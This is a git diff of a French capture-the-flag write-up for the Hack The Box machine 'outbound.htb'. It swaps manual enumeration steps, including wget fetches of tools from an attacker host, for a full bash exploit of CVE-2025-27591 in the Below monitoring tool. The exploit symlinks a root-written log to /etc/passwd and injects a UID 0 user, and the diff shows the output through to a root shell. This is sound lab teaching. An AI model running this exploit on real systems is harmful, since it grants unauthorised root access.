@@ -834,7 +834,6 @@ La réutilisation des identifiants récupérés dans le mail fonctionne cette fo
 
 ```bash
 ssh jacob@outbound.htb
-jacob@outbound.htb's password:
 ```
 
 Après authentification, tu obtiens un shell interactif en tant qu’utilisateur `jacob` :
@@ -1025,13 +1024,13 @@ https://github.com/obamalaolu/CVE-2025-27591/blob/main/CVE-2025-27591.sh
 ### Sudo -l
 Une fois connecté en SSH avec l’utilisateur `jacob`, tu commences par vérifier les droits sudo disponibles :
 
-```
+```bash
 sudo -l
 ```
 
 Le résultat montre que `jacob` peut exécuter `/usr/bin/below` avec `sudo` sans mot de passe :
 
-```
+```bash
 User jacob may run the following commands on outbound:
     (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below
         --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
@@ -1043,161 +1042,199 @@ La suite de l’escalade va donc consister à analyser ce binaire et à vérifie
 
 ### Analyse de `below`
 
-En consultant les mails de `jacob`, tu remarques une information importante : l’utilisateur possède des droits de lecture sur les logs générés par `below`.
+Les droits sudo précédemment identifiés montrent que l’utilisateur `jacob` peut exécuter le binaire `below` avec les privilèges `root`.
 
-Comme `jacob` peut également exécuter `/usr/bin/below` avec `sudo`, cela devient une piste particulièrement intéressante.
+Comme les mails consultés plus tôt mentionnent également des droits de lecture sur les logs de cette application, cette piste mérite d’être approfondie.
 
-Tu commences donc par récupérer davantage d’informations sur le binaire et sa version :
-
-```
-below --version
-dpkg -l | grep below
-```
-
-L’objectif est alors de vérifier si la version installée de Below est connue pour contenir une vulnérabilité exploitable permettant une escalade de privilèges via la gestion de ses logs ou de ses fichiers temporaires.
-
-
+Tu commences donc par rechercher tous les fichiers liés à `below` présents sur le système :
 
 ```bash
- below --help
-Usage: below [OPTIONS] [COMMAND]
-
-Commands:
-  live      Display live system data (interactive) (default)
-  record    Record local system data (daemon mode)
-  replay    Replay historical data (interactive)
-  debug     Debugging facilities (for development use)
-  dump      Dump historical data into parseable text format
-  snapshot  Create a historical snapshot file for a given time
-                range
-  help      Print this message or the help of the given
-                subcommand(s)
-
-Options:
-      --config <CONFIG>  [default: /etc/below/below.conf]
-  -d, --debug            
-  -h, --help             Print help
+find / -iname "*below*" 2>/dev/null
 ```
 
-
-
-### Exploration du contexte utilisateur
-
-Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
+Cette recherche révèle notamment plusieurs éléments intéressants :
 
 ```bash
-whoami
-id
-pwd
-uname -a
-hostname
+/opt/below
+/usr/bin/below
+/var/log/below
+/etc/systemd/system/below.service
 ```
 
-Résultat :
+Le répertoire `/opt/below` attire immédiatement l’attention car il semble contenir bien plus qu’un simple binaire installé.
+
+Tu explores alors son contenu afin de mieux comprendre la structure de l’application :
 
 ```bash
-jacob
-uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
-/home/jacob
-Linux outbound 6.8.0-63-generic #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
-outbound
+ls -lah /opt/below
+find /opt/below -maxdepth 2 -type f
 ```
 
-
-
-### Recherche de binaires SUID
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+Tu identifies rapidement plusieurs fichiers typiques d’un projet développé en Rust :
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+Cargo.toml
+Cargo.lock
+rustfmt.toml
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
+> **Note**
+>
+> Rust est un langage de programmation moderne souvent utilisé pour développer des outils système performants et sécurisés.
+>  Les projets Rust utilisent généralement un fichier `Cargo.toml` qui contient les informations principales du projet, comme son nom, sa version et ses dépendances.
 
-```texte
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgrp
+
+
+Comme plusieurs composants semblent présents dans le projet, tu recherches alors tous les fichiers `Cargo.toml` :
+
+```bash
+find /opt/below -name "Cargo.toml"
+```
+
+Le résultat montre de nombreux sous-composants Rust :
+
+```bash
+/opt/below/below/render/Cargo.toml
+/opt/below/below/store/Cargo.toml
+/opt/below/below/view/Cargo.toml
+/opt/below/below/model/Cargo.toml
 ...
+/opt/below/below/Cargo.toml
 ```
 
-Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
+Cela confirme que `/opt/below` contient les sources complètes du projet Below ainsi que plusieurs modules internes compilés séparément.
 
-### Analyse des Linux capabilities
-
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
-
-La vérification se fait avec la commande suivante :
+Le fichier intéressant est alors celui situé à la racine du composant principal :
 
 ```bash
-getcap -r / 2>/dev/null
+cat /opt/below/below/Cargo.toml
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
-
-### Vérification des SUID avec suid3num.py
-
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
-
-les binaires SUID intéressants
-leur présence éventuelle dans GTFOBins
-
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
+Tu y retrouves les informations du paquet principal :
 
 ```bash
-cd /dev/shm
-wget http://10.10.x.x:8000/suid3num.py
-python3 suid3num.py
+[package]
+name = "below"
+version = "0.8.0"
+repository = "https://github.com/facebookincubator/below"
 ```
-L’outil confirme que :
 
-- tous les binaires SUID présents sont standards
-- aucun binaire personnalisé n’est identifié
-- aucun binaire exploitable via GTFOBins n’est détecté
-  
+Cela permet d’identifier précisément la version installée et de commencer l’analyse d’éventuelles vulnérabilités connues affectant cette version.
 
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
+### Exploit de `below`
 
-### Inspection des tâches cron
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
+Après avoir identifié la version `0.8.0` de Below, tu recherches alors d’éventuelles vulnérabilités publiques affectant cette version.
 
-Les crons système peuvent être consultés avec :
+Une recherche rapide montre que les versions de `below` inférieures à `0.8.1` sont vulnérables à la CVE-2025-27591, une faille d’escalade de privilèges affectant l’outil.
+
+Une recherche sur `CVE-2025-27591` mène ensuite facilement vers un dépôt GitHub contenant un exploit public :
+
+[obamalaolu/CVE-2025-27591](https://github.com/obamalaolu/CVE-2025-27591?utm_source=chatgpt.com)
+
+<img src="below-rce-github.png" alt="Résultat de recherche GitHub montrant le dépôt obamalaolu/CVE-2025-27591 contenant un exploit d’escalade de privilèges pour Below" class="img-left-60">
+
+La description du dépôt indique qu’il s’agit d’une vulnérabilité d’escalade de privilèges affectant l’outil de monitoring `Below`, ce qui correspond précisément au contexte observé sur la machine.
+
+### Exploitation de CVE-2025-27591
+
+Tu crées ensuite un script d’exploitation sur la machine cible :
 
 ```bash
-cat /etc/crontab
+ce /dev/shm
+nano exploit.sh
 ```
 
-### Analyse des services locaux
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
+Et tu entres le code de l'exploit :
 
+```bash
+#!/bin/bash
+
+# CVE-2025-27591 Exploit - Privilege Escalation via 'below'
+
+TARGET="/etc/passwd"
+LINK_PATH="/var/log/below/error_root.log"
+TMP_PAYLOAD="/tmp/payload"
+BACKUP="/tmp/passwd.bak"
+
+echo "[*] CVE-2025-27591 Privilege Escalation Exploit"
+
+# Check for sudo access to below
+echo "[*] Checking sudo permissions..."
+if ! sudo -l | grep -q '/usr/bin/below'; then
+  echo "[!] 'below' is not available via sudo. Exiting."
+  exit 1
+fi
+
+# Backup current /etc/passwd
+echo "[*] Backing up /etc/passwd to $BACKUP"
+cp /etc/passwd "$BACKUP"
+
+# Generate password hash for 'haxor' user (password: hacked123)
+echo "[*] Generating password hash..."
+HASH=$(openssl passwd -6 'hacked123')
+
+# Prepare malicious passwd line
+echo "[*] Creating malicious passwd line..."
+echo "haxor:$HASH:0:0:root:/root:/bin/bash" > "$TMP_PAYLOAD"
+
+# Create symlink
+echo "[*] Linking $LINK_PATH to $TARGET"
+rm -f "$LINK_PATH"
+ln -sf "$TARGET" "$LINK_PATH"
+
+# Trigger log creation with invalid --time to force below to recreate the log
+echo "[*] Triggering 'below' to write to symlinked log..."
+sudo /usr/bin/below replay --time "invalid" >/dev/null 2>&1
+
+# Overwrite passwd file via symlink
+echo "[*] Injecting malicious user into /etc/passwd"
+cat "$TMP_PAYLOAD" > "$LINK_PATH"
+
+# Test access
+echo "[*] Try switching to 'haxor' using password: hacked123"
+su haxor
 ```
-netstat -tulpn
+
+Après avoir sauvegardé le script, tu le rends exécutable puis tu le lances depuis `/dev/shm` :
+
+```bash
+chmod +x exploit.sh
+./exploit.sh
 ```
 
-### pspy64
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
+L’exploit sauvegarde d’abord `/etc/passwd`, crée une nouvelle entrée utilisateur avec l’UID `0` (root), puis détourne le fichier de log `error_root.log` de `below` via un lien symbolique afin d’injecter directement cette nouvelle entrée dans `/etc/passwd`.
 
-Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
 
-cd /var/tmp
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
 
-L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
+```bash
+jacob@outbound:/dev/shm$ ./exploit.sh
+[*] CVE-2025-27591 Privilege Escalation Exploit
+[*] Checking sudo permissions...
+[*] Backing up /etc/passwd to /tmp/passwd.bak
+[*] Generating password hash...
+[*] Creating malicious passwd line...
+[*] Linking /var/log/below/error_root.log to /etc/passwd
+[*] Triggering 'below' to write to symlinked log...
+[*] Injecting malicious user into /etc/passwd
+[*] Try switching to 'haxor' using password: hacked123
+Password:
+```
 
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+ Le script termine par un `su haxor` : il ne reste alors plus qu’à saisir le mot de passe `hacked123` pour obtenir un shell `root`.
 
-### Conclusion de l’énumération manuelle
+```bash
+haxor@outbound:/dev/shm# id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
+Tu peux alors accéder au répertoire `/root` et lire le flag final :
 
----
+```bash
+haxor@outbound:/dev/shm# cat /root/root.txt
+0b38xxxxxxxxxxxxxxxxxxxxxxxxxxxd5df
+```
+
+La machine est maintenant entièrement compromise, ce qui termine le challenge `outbound.htb`.
 
 ## Conclusion
 
